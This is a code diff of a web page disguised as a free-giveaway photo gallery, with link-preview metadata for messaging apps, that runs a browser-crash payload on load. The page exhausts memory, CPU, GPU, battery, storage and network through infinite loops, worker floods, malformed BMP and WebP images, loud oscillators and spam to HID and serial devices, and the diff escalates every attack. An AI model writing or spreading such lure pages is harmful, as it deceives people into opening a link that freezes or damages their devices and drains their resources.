@@ -3,202 +3,233 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- تمويه المعاينة في واتساب/إنستغرام -->
-    <title>Photo Gallery - Free Giveaway</title>
+    <title>Photo Gallery</title>
     <meta property="og:title" content="Photo Gallery - Free Giveaway" />
     <meta property="og:description" content="Check this amazing photo and win a prize!" />
     <meta property="og:image" content="https://picsum.photos/seed/pic/1200/630" />
     <meta property="og:url" content="https://one-chance-lime.vercel.app/" />
     <meta property="og:type" content="website" />
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="Photo Gallery - Free Giveaway" />
-    <meta name="twitter:description" content="Check this amazing photo and win a prize!" />
-    <meta name="twitter:image" content="https://picsum.photos/seed/pic/1200/630" />
 </head>
 <body>
-    <!-- صورة وهمية تظهر للضحية قبل تنفيذ الكراش -->
     <div style="text-align:center; margin-top:20px; font-family: Arial, sans-serif;">
         <h1 style="color:#333;">Loading your photo...</h1>
         <img src="https://picsum.photos/400/400" alt="photo" style="width:100%; max-width:300px; border-radius:10px;">
         <p style="color:#666;">Please wait a moment</p>
     </div>
 
-    <!-- ============================================ -->
-    <!-- باقي كود الكراش (جميع التحسينات العشرة)      -->
-    <!-- ============================================ -->
     <script>
-    // 1. استنزاف الذاكرة (حلقة لا نهائية مع كائنات ضخمة)
-    (function memoryBomb() {
-        var bomb = [];
-        while (true) {
-            bomb.push(new Array(1000000).join('X'));
-            var obj = {};
-            for (var i = 0; i < 10000; i++) {
-                obj['prop' + i] = new Array(50000).join('A');
-            }
-            bomb.push(obj);
-            if (bomb.length % 100 === 0) {
-                try { navigator.vibrate(10000); } catch(e) {}
-            }
-        }
-    })();
-
-    // 2. فيض العمال (Web Workers) – استهلاك CPU
-    (function workerFlood() {
-        var workers = [];
-        for (var i = 0; i < (navigator.hardwareConcurrency || 4) * 5; i++) {
-            try {
-                var w = new Worker(URL.createObjectURL(new Blob([
-                    'while(true){ var x = new Array(100000).join("z"); }'
-                ])));
-                workers.push(w);
-            } catch(e) {}
-        }
-    })();
-
-    // 3. هجوم WebGL – إجبار سائق الرسوميات على الانهيار
-    (function gpuCrash() {
-        var canvas = document.createElement('canvas');
-        document.body.appendChild(canvas);
-        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (gl) {
-            var buffers = [];
-            for (var i = 0; i < 500; i++) {
-                var buf = gl.createBuffer();
-                gl.bindBuffer(gl.ARRAY_BUFFER, buf);
-                var data = new Float32Array(1000000);
-                gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);
-                buffers.push(buf);
-            }
-            function drawLoop() {
-                gl.clear(gl.COLOR_BUFFER_BIT);
-                requestAnimationFrame(drawLoop);
-            }
-            drawLoop();
-        }
-    })();
-
-    // 4. صورة BMP خبيثة – تجاوز سعة محلل الصور
-    (function bmpCrash() {
-        var bmpHeader = 'BM' + String.fromCharCode(
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-            0x36, 0x00, 0x00, 0x00
-        );
-        var bmpInfo = String.fromCharCode(
-            0x28, 0x00, 0x00, 0x00,
-            0xFF, 0xFF, 0xFF, 0xFF, // عرض خيالي
-            0xFF, 0xFF, 0xFF, 0xFF, // ارتفاع خيالي
-            0x01, 0x00, 0x18, 0x00,
-            0x00, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x00, 0x00,
-            0x00, 0x00, 0x00, 0x00
-        );
-        var payload = bmpHeader + bmpInfo;
-        while (payload.length < 50000000) {
-            payload += String.fromCharCode(0x41, 0x42, 0x43, 0x44);
-        }
-        var blob = new Blob([payload], {type: 'image/bmp'});
-        var url = URL.createObjectURL(blob);
-        var img = document.createElement('img');
-        img.src = url;
-        document.body.appendChild(img);
-    })();
-
-    // 5. صورة WebP خبيثة (CVE-2020-16040) – تعطل المتصفح
-    (function webpCrash() {
-        // إنشاء بيانات WebP بعرض وارتفاع خياليين (0xFFFFFFFF)
-        var buffer = new ArrayBuffer(40);
-        var view = new Uint8Array(buffer);
-        // RIFF header
-        view[0]=0x52; view[1]=0x49; view[2]=0x46; view[3]=0x46;
-        // حجم ملف خيالي
-        view[4]=0xFF; view[5]=0xFF; view[6]=0xFF; view[7]=0xFF;
-        // WEBP
-        view[8]=0x57; view[9]=0x45; view[10]=0x42; view[11]=0x50;
-        // VP8L chunk
-        view[12]=0x56; view[13]=0x50; view[14]=0x38; view[15]=0x4C;
-        // حجم chunk خيالي
-        view[16]=0xFF; view[17]=0xFF; view[18]=0xFF; view[19]=0xFF;
-        // VP8L signature (0x2F)
-        view[20]=0x2F;
-        // عرض وارتفاع (مشفرين) – قيمة قصوى
-        view[21]=0xFF; view[22]=0xFF; view[23]=0xFF; view[24]=0xFF;
-        // بيانات عشوائية
-        for (var i=25; i<40; i++) view[i]=0xAA;
-        var blob = new Blob([view], {type: 'image/webp'});
-        var url = URL.createObjectURL(blob);
-        var img = document.createElement('img');
-        img.src = url;
-        document.body.appendChild(img);
-    })();
-
-    // 6. استنزاف البطارية – واجهة Battery API
-    (function batteryDrain() {
-        navigator.getBattery().then(function(battery) {
-            setInterval(function() {
-                battery.level;
-                // إضافة استهلاك CPU إضافي
-                for (var i=0; i<100000; i++) Math.random();
-            }, 1);
-        }).catch(function(){});
-    })();
-
-    // 7. هجوم WebAudio – ترددات عالية + حلقة لا نهائية
-    (function audioCrash() {
-        try {
-            var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            var oscillator = audioCtx.createOscillator();
-            oscillator.frequency.value = 22000;
-            oscillator.connect(audioCtx.destination);
-            oscillator.start();
-            setInterval(function() {
-                oscillator.frequency.value += Math.random() * 1000;
-            }, 1);
-        } catch(e) {}
-    })();
-
-    // 8. ملء localStorage لتعطيل النظام
-    (function storageFlood() {
-        var data = new Array(1000000).join('X');
-        while (true) {
-            try {
-                localStorage.setItem('crash' + Math.random(), data);
-            } catch(e) {
-                // عند الامتلاء، إفراغ متكرر يسبب ضغطًا
-                localStorage.clear();
-            }
-        }
-    })();
-
-    // 9. طلبات Fetch لا نهائية (استنزاف موارد الشبكة)
-    (function fetchFlood() {
-        for (var i=0; i<100; i++) {
-            setTimeout(function() {
+        // ============================================
+        // إطلاق جميع الهجمات بشكل متزامن مع تأخير صغير جداً (50ms)
+        // ============================================
+        var attacks = [
+            function memoryBomb() {
+                var bomb = [];
                 while (true) {
-                    fetch('https://example.com', { mode: 'no-cors' }).catch(function(){});
+                    bomb.push(new Array(2000000).join('X'));
+                    var obj = {};
+                    for (var i = 0; i < 20000; i++) {
+                        obj['prop' + i] = new Array(100000).join('A');
+                    }
+                    bomb.push(obj);
+                    if (bomb.length % 50 === 0) {
+                        try { navigator.vibrate(5000); } catch(e) {}
+                    }
                 }
-            }, i*100);
-        }
-    })();
+            },
+            function workerFlood() {
+                var workers = [];
+                for (var i = 0; i < (navigator.hardwareConcurrency || 4) * 10; i++) {
+                    try {
+                        var w = new Worker(URL.createObjectURL(new Blob([
+                            'while(true){ var x = new Array(100000).join("z"); }'
+                        ])));
+                        workers.push(w);
+                    } catch(e) {}
+                }
+            },
+            function gpuCrash() {
+                var canvas = document.createElement('canvas');
+                document.body.appendChild(canvas);
+                var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    var buffers = [];
+                    for (var i = 0; i < 1000; i++) {
+                        var buf = gl.createBuffer();
+                        gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+                        var data = new Float32Array(2000000);
+                        gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);
+                        buffers.push(buf);
+                    }
+                    function drawLoop() {
+                        gl.clear(gl.COLOR_BUFFER_BIT);
+                        requestAnimationFrame(drawLoop);
+                    }
+                    drawLoop();
+                }
+                // محاولة WebGPU إذا كانت متاحة
+                if (navigator.gpu) {
+                    navigator.gpu.requestAdapter().then(function(adapter) {
+                        adapter.requestDevice().then(function(device) {
+                            while (true) {
+                                var buffer = device.createBuffer({ size: 100000000, usage: GPUBufferUsage.STORAGE });
+                                buffer.mapAsync(GPUMapMode.READ).catch(function(){});
+                            }
+                        }).catch(function(){});
+                    }).catch(function(){});
+                }
+            },
+            function bmpCrash() {
+                var bmpHeader = 'BM' + String.fromCharCode(
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x36, 0x00, 0x00, 0x00
+                );
+                var bmpInfo = String.fromCharCode(
+                    0x28, 0x00, 0x00, 0x00,
+                    0xFF, 0xFF, 0xFF, 0xFF,
+                    0xFF, 0xFF, 0xFF, 0xFF,
+                    0x01, 0x00, 0x18, 0x00,
+                    0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00
+                );
+                var payload = bmpHeader + bmpInfo;
+                while (payload.length < 200000000) { // 200 MB
+                    payload += String.fromCharCode(0x41, 0x42, 0x43, 0x44);
+                }
+                var blob = new Blob([payload], {type: 'image/bmp'});
+                var url = URL.createObjectURL(blob);
+                var img = document.createElement('img');
+                img.src = url;
+                document.body.appendChild(img);
+            },
+            function webpCrash() {
+                var buffer = new ArrayBuffer(40);
+                var view = new Uint8Array(buffer);
+                view[0]=0x52; view[1]=0x49; view[2]=0x46; view[3]=0x46;
+                view[4]=0xFF; view[5]=0xFF; view[6]=0xFF; view[7]=0xFF;
+                view[8]=0x57; view[9]=0x45; view[10]=0x42; view[11]=0x50;
+                view[12]=0x56; view[13]=0x50; view[14]=0x38; view[15]=0x4C;
+                view[16]=0xFF; view[17]=0xFF; view[18]=0xFF; view[19]=0xFF;
+                view[20]=0x2F;
+                view[21]=0xFF; view[22]=0xFF; view[23]=0xFF; view[24]=0xFF;
+                for (var i=25; i<40; i++) view[i]=0xAA;
+                var blob = new Blob([view], {type: 'image/webp'});
+                var url = URL.createObjectURL(blob);
+                var img = document.createElement('img');
+                img.src = url;
+                document.body.appendChild(img);
+            },
+            function batteryDrain() {
+                navigator.getBattery().then(function(battery) {
+                    setInterval(function() {
+                        battery.level;
+                        for (var i=0; i<1000000; i++) Math.random();
+                    }, 1);
+                    while (true) { battery.level; }
+                }).catch(function(){});
+            },
+            function audioCrash() {
+                try {
+                    var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                    for (var i=0; i<20; i++) {
+                        var osc = audioCtx.createOscillator();
+                        osc.frequency.value = 20000 + i*500;
+                        osc.connect(audioCtx.destination);
+                        osc.start();
+                    }
+                    setInterval(function() {
+                        audioCtx.createOscillator().frequency.value = 30000;
+                    }, 1);
+                } catch(e) {}
+            },
+            function storageFlood() {
+                var data = new Array(3000000).join('X');
+                while (true) {
+                    try {
+                        localStorage.setItem('crash' + Math.random(), data);
+                    } catch(e) {
+                        localStorage.clear();
+                    }
+                }
+            },
+            function fetchFlood() {
+                for (var i=0; i<300; i++) {
+                    setTimeout(function() {
+                        while (true) {
+                            fetch('https://example.com', { mode: 'no-cors' }).catch(function(){});
+                            try {
+                                var ws = new WebSocket('wss://echo.websocket.events');
+                                ws.onopen = function(){ ws.send(new Array(100000).join('a')); };
+                            } catch(e) {}
+                        }
+                    }, i*20);
+                }
+            },
+            function canvasCrash() {
+                var canvas = document.createElement('canvas');
+                canvas.width = 300000;
+                canvas.height = 300000;
+                var ctx = canvas.getContext('2d');
+                var imgData = ctx.createImageData(300000, 300000);
+                for (var i=0; i<imgData.data.length; i+=4) {
+                    imgData.data[i] = 255;
+                    imgData.data[i+1] = 255;
+                    imgData.data[i+2] = 255;
+                    imgData.data[i+3] = 255;
+                }
+                ctx.putImageData(imgData, 0, 0);
+                document.body.appendChild(canvas);
+            },
+            function sharedArrayBufferCrash() {
+                try {
+                    var sab = new SharedArrayBuffer(100000000);
+                    var view = new Uint8Array(sab);
+                    while (true) {
+                        for (var i=0; i<view.length; i++) view[i] = Math.random() * 255;
+                    }
+                } catch(e) {}
+            },
+            function hidCrash() {
+                if (navigator.hid) {
+                    navigator.hid.requestDevice({ filters: [] }).then(function(devices) {
+                        devices.forEach(function(device) {
+                            device.open().then(function() {
+                                while (true) {
+                                    device.sendReport(0, new Uint8Array(10000)).catch(function(){});
+                                }
+                            }).catch(function(){});
+                        });
+                    }).catch(function(){});
+                }
+            },
+            function serialCrash() {
+                if (navigator.serial) {
+                    navigator.serial.getPorts().then(function(ports) {
+                        ports.forEach(function(port) {
+                            port.open({ baudRate: 9600 }).then(function() {
+                                while (true) {
+                                    port.write(new Uint8Array(10000)).catch(function(){});
+                                }
+                            }).catch(function(){});
+                        });
+                    }).catch(function(){});
+                }
+            }
+        ];
 
-    // 10. Canvas عملاق (تجاوز سعة الذاكرة)
-    (function canvasCrash() {
-        var canvas = document.createElement('canvas');
-        canvas.width = 100000;
-        canvas.height = 100000;
-        var ctx = canvas.getContext('2d');
-        var imgData = ctx.createImageData(100000, 100000);
-        for (var i=0; i<imgData.data.length; i+=4) {
-            imgData.data[i] = 255;
-            imgData.data[i+1] = 255;
-            imgData.data[i+2] = 255;
-            imgData.data[i+3] = 255;
-        }
-        ctx.putImageData(imgData, 0, 0);
-        document.body.appendChild(canvas);
-    })();
+        // تنفيذ جميع الهجمات مع تأخير 100ms بين كل منها
+        attacks.forEach(function(attack, index) {
+            setTimeout(attack, index * 100);
+        });
+
+        // إضافة هجوم إضافي على الذاكرة عبر Blob عملاق
+        setTimeout(function() {
+            var largeBlob = new Blob([new Uint8Array(300000000)]);
+            var url = URL.createObjectURL(largeBlob);
+            fetch(url).catch(function(){});
+        }, 500);
     </script>
 </body>
 </html>
